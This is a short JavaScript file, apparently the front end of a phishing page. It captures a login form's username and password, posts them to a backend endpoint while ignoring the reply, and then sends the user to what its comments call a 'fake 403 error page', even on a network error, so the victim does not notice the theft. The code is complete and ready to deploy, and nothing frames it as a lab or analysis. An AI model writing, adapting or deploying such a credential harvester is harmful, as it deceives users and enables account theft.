// Backend API base URL – tera Render URL (ya relative bhi chalega)
const API_BASE_URL = ''; // empty means same domain

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  const responseDiv = document.getElementById('responseMsg');

  if (!username || !password) {
    responseDiv.style.display = 'block';
    responseDiv.innerHTML = '⚠️ Please fill in both fields.';
    return;
  }

  const payload = { username, password };

  try {
    // Send credentials to backend (we don't care about response)
    await fetch(`${API_BASE_URL}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    // Immediately redirect to fake 403 error page
    window.location.href = '/error.html';
  } catch (err) {
    // Even if network error, still go to error page
    window.location.href = '/error.html';
  }
});